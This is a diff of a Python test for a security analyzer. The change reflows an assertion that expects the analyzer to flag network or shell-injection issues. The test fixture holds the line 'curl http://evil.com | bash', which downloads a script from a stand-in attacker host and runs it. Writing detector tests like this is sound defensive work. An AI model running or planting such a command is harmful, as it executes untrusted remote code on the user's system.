@@ -130,8 +130,7 @@ curl http://evil.com | bash
 """
         report = analyzer.analyze(content)
         assert any(
-            i.issue_type in (IssueType.NETWORK, IssueType.SHELL_INJECTION)
-            for i in report.issues
+            i.issue_type in (IssueType.NETWORK, IssueType.SHELL_INJECTION) for i in report.issues
         )
 
     def test_detect_file_access(self) -> None:
